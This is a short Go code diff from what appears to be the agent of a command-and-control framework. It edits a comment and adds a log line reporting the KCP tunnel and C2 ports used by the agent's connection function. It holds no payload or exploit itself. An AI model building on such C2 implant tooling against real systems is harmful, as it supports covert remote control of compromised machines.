@@ -14,11 +14,13 @@ var (
 	KCPC2Cancel context.CancelFunc
 )
 
-// Connect to C2 KCP server, forward Shadowsocks traffic
+// Connect to C2 KCP server, then to C2 server
 func KCPC2Client() {
 	if !RuntimeConfig.UseKCP {
 		return
 	}
+	log.Printf("C2 traffic will go through KCP tunnel at port %s, KCP server port %s, C2 port %s",
+		RuntimeConfig.KCPClientPort, RuntimeConfig.KCPServerPort, RuntimeConfig.CCPort)
 	// this context ends when agent exits
 	KCPC2Ctx, KCPC2Cancel = context.WithCancel(context.Background())
 	defer func() {
